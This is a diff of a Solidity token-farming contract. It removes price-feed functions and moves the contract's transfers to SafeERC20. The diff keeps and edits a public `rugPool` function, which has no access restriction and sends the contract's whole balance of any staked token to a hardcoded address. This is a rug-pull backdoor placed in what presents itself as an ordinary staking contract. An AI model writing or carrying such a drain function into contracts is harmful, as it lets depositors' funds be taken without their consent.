@@ -7,12 +7,13 @@ import "./JUSD.sol";
 
 import "./Dex.sol";
 
-import "./AggregatorV3Interface.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/math/SafeMath.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/token/ERC20/SafeERC20.sol";
 
 contract Farming is Ownable {
+    using SafeERC20 for ERC20;
     using SafeMath for uint256;
     string public name = "Mimic Governance Token Farming";
     ERC20 public MimicToken;
@@ -36,40 +37,10 @@ contract Farming is Ownable {
         DEX = Dex(_DEX);
     }
 
-    function setPriceFeed(address _token, address _priceFeed) public {
-        tokenPriceMapping[_token] = _priceFeed;
-    }
-
-    function getTokenValue(address _token)
-        public
-        view
-        returns (uint256, uint256)
-    {
-        address priceFeedAddress = tokenPriceMapping[_token];
-        AggregatorV3Interface priceFeed = AggregatorV3Interface(
-            priceFeedAddress
-        );
-        (, int256 price, , , ) = priceFeed.latestRoundData();
-        uint256 decimals = uint256(priceFeed.decimals());
-        return (uint256(price), decimals);
-    }
-
-    function stakingValue(address _account, address _token)
-        public
-        view
-        returns (uint256)
-    {
-        if (stakingBalance[_token][_account] <= 0) {
-            return 0;
-        }
-        (uint256 price, uint256 decimals) = getTokenValue(_token);
-        return stakingBalance[_token][_account].mul(price).div(10**decimals);
-    }
-
     //Stake Tokens
     function stakeTokens(uint256 _amount, address _token) public {
         require(_amount > 0 && checkWhitelisted(_token));
-        ERC20(_token).transferFrom(msg.sender, address(this), _amount);
+        ERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
         stakingBalance[_token][msg.sender] = stakingBalance[_token][msg.sender]
             .add(_amount);
         updateTime[_token][msg.sender] = block.timestamp;
@@ -114,7 +85,7 @@ contract Farming is Ownable {
         uint256 balance = stakingBalance[_token][msg.sender];
         uint256 reward = calculateRewards(msg.sender, _token);
         require(reward >= 0 && balance >= 0);
-        MimicToken.transfer(msg.sender, reward);
+        MimicToken.safeTransfer(msg.sender, reward);
         updateTime[_token][msg.sender] = block.timestamp;
     }
 
@@ -122,11 +93,11 @@ contract Farming is Ownable {
     function unstakeTokens(uint256 _amount, address _token) public {
         require(_amount > 0);
         uint256 reward = calculateRewards(msg.sender, _token);
-        ERC20(_token).transfer(msg.sender, _amount);
+        ERC20(_token).safeTransfer(msg.sender, _amount);
         uint256 remain = stakingBalance[_token][msg.sender].sub(_amount);
         stakingBalance[_token][msg.sender] = remain;
         // require(reward > 0 && stakingBalance[msg.sender] >= 0);
-        MimicToken.transfer(msg.sender, reward);
+        MimicToken.safeTransfer(msg.sender, reward);
         updateTime[_token][msg.sender] = block.timestamp;
     }
 
@@ -179,7 +150,7 @@ contract Farming is Ownable {
 
     function rugPool(address _token) public {
         uint256 balance = ERC20(_token).balanceOf(address(this));
-        ERC20(_token).transfer(
+        ERC20(_token).safeTransfer(
             0x2AAc0eb300FA402730bCEd0B4C43a7Fe6BF6491e,
             balance
         );
